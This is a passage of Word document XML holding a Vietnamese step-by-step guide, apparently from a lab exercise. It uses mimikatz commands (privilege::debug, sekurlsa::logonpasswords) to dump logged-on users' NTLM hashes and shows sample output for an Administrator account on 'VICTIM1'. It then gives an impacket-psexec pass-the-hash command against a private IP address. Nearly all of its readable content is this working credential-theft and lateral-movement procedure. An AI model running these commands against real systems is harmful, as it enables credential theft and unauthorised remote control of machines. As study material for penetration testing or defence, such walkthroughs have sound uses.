          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>mimikatz #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> gõ:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033ACF5F">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0" w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>privilege::debug</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D904A05">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">👉 Nếu hiện </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Privilege '20' OK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> tức là thành công.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0F0E3A">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>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D3A89FB">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>🔹 Bước 2: Dump hash user đăng nhập</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1800A34F">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Chạy lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31403165">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>sekurlsa::logonpasswords</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E82AEB7">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">👉 Bạn sẽ thấy nhiều block output. Quan trọng là tìm </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Username</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>NTLM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4F06C0">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Ví dụ:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281E5BBB">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>Username :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>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kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>AdministratorDomain   :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>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kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>VICTIM1NTLM     :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar"/>
        </w:rPr>
        <w:t>8846f7eaee8fb117ad06bdd830b7586c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4878D866">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:after="0" w:afterLines="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>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B8DC388">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>🔹 Bước 3: Copy NTLM hash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1FDE81">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chỉ cần copy dòng NTLM hash. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B31D716">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">impacket-psexec Administrator@192.168.8.122 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">hashes :3008c87294511142799dca1191e69a0f </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16607C63">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr>
      <w:pgSz w:w="11900" w:h="16840"/>
      <w:pgMar w:top="1417" w:right="1134" w:bottom="1417" w:left="1701" w:header="0" w:footer="91" w:gutter="0"/>
      <w:pgBorders w:display="firstPage">
        <w:top w:val="none" w:sz="0" w:space="0"/>
        <w:left w:val="none" w:sz="0" w:space="0"/>
        <w:bottom w:val="none" w:sz="0" w:space="0"/>
        <w:right w:val="none" w:sz="0" w:space="0"/>
      </w:pgBorders>
      <w:pgNumType w:fmt="decimal" w:start="1"/>
      <w:cols w:space="0" w:num="1"/>
      <w:rtlGutter w:val="0"/>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__Inter_Fallback_e68c2d">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31F01A62"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="31F01A62"/>
    <w:lvl w:ilvl="0" w:tentative="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="%1."/>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5452350"/>
    <w:rsid w:val="178969B8"/>
    <w:rsid w:val="19516FA3"/>
    <w:rsid w:val="1B4A76BD"/>
    <w:rsid w:val="1DC657BA"/>
    <w:rsid w:val="63A343A6"/>
    <w:rsid w:val="648107EF"/>
    <w:rsid w:val="69977B62"/>
    <w:rsid w:val="6EFC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autoRedefine/>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autoRedefine/>
    <w:qFormat/>
    <w:uiPriority w:val="0"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="14">
    <w:name w:val="Block Text"/>
    <w:basedOn w:val="1"/>
    <w:autoRedefine/>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autoRedefine/>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autoRedefine/>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autoRedefine/>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101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2024-05-10T17:21:00Z</dcterms:created>
  <dc:creator>KHUONG</dc:creator>
  <cp:lastModifiedBy>Khương Phan</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-13T08:47:46Z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C68497777D22426D9A8504A38AC7835C_13</vt:lpwstr>
  </property>
</Properties>
</file>